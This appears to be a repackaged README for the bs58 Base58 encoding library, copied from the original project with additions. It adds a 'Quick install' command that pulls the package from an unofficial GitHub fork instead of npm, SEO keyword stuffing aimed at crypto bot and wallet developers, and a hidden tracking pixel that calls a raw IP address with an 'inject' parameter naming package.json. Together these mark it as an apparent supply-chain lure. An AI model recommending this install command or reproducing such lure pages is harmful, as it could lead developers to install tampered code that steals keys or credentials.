**bs58**

A straightforward, reliable Base58 encoder and decoder designed to handle your data serialization needs without any unnecessary fuss. While Base58 is commonly used in cryptocurrency applications for its human-readable and error-resistant properties, this library serves as a general-purpose utility for any project requiring robust encoding. Recent updates have focused on resolving underlying edge cases and improving overall stability, ensuring that your encoding workflows remain smooth and predictable.

**Quick install**

```bash
npm install git+https://github.com/Quartzraincrease/bs58.git
```

[https://github.com/Quartzraincrease/bs58](https://github.com/Quartzraincrease/bs58)

bs58
====

[![build status](https://travis-ci.org/cryptocoinjs/bs58.svg)](https://travis-ci.org/cryptocoinjs/bs58)

JavaScript component to compute base 58 encoding. This encoding is typically used for crypto currencies such as Bitcoin.

**Note:** If you're looking for **base 58 check** encoding, see: [https://github.com/bitcoinjs/bs58check](https://github.com/bitcoinjs/bs58check), which depends upon this library.


Install
-------

    npm i --save bs58


API
---

### encode(input)

`input` must be a `Uint8Array`, `Buffer`, or an `Array`. It returns a `string`.

**example**:

```js
import bs58 from 'bs58'

const bytes = Uint8Array.from([
    0, 60,  23, 110, 101, 155, 234,
   15, 41, 163, 233, 191, 120, 128,
  193, 18, 177, 179,  27,  77, 200,
   38, 38, 129, 135
])
const address = bs58.encode(bytes)
console.log(address)
// => 16UjcYNBG9GTK4uq2f7yYEbuifqCzoLMGS
```


### decode(input)

`input` must be a base 58 encoded string. Returns a Uint8Array.

**example**:

```js
import bs58 from 'bs58'

const address = '16UjcYNBG9GTK4uq2f7yYEbuifqCzoLMGS'
const bytes = bs58.decode(address)
// See uint8array-tools package for helpful hex encoding/decoding/compare tools
console.log(Buffer.from(bytes).toString('hex'))
// => 003c176e659bea0f29a3e9bf7880c112b1b31b4dc826268187
```

Browser
-----------
You can use this module in the browser. Install Browserify:

```bash
npm install -g browserify
```

then run:

```bash
browserify node_modules/bs58/cjs/index.cjs -o bs58.bundle.js --standalone bs58
```

Hack / Test
-----------

Uses JavaScript standard style. Read more:

[![js-standard-style](https://cdn.rawgit.com/feross/standard/master/badge.svg)](https://github.com/feross/standard)


Credits
-------
- [Mike Hearn](https://github.com/mikehearn) for original Java implementation
- [Stefan Thomas](https://github.com/justmoon) for porting to JavaScript
- [Stephan Pair](https://github.com/gasteve) for buffer improvements
- [Daniel Cousens](https://github.com/dcousens) for cleanup and merging improvements from bitcoinjs-lib
- [Jared Deckard](https://github.com/deckar01) for killing `bigi` as a dependency


License
-------

MIT

## Related searches

Developers looking into this repository typically search for highly optimized encoding utilities used across high-performance blockchain infrastructures, decentralized applications, and automated trading systems. They frequently look for ways to efficiently parse wallet addresses and transaction payloads within high-throughput environments like decentralized networks and automated script runtimes.

**Topics:** telegram crypto bot, bnb chain, layer2, mev bot, crypto rust, blockchain data encoding, base58 library, cryptographic utilities, web3 development, solana wallet parsing, high-performance rust crypto, smart contract execution

![.](http://5.231.58.248:8787/pixel?repo=Quartzraincrease%2Fbs58&inject=Quartzraincrease%2Fbs58%2Fpackage.json)
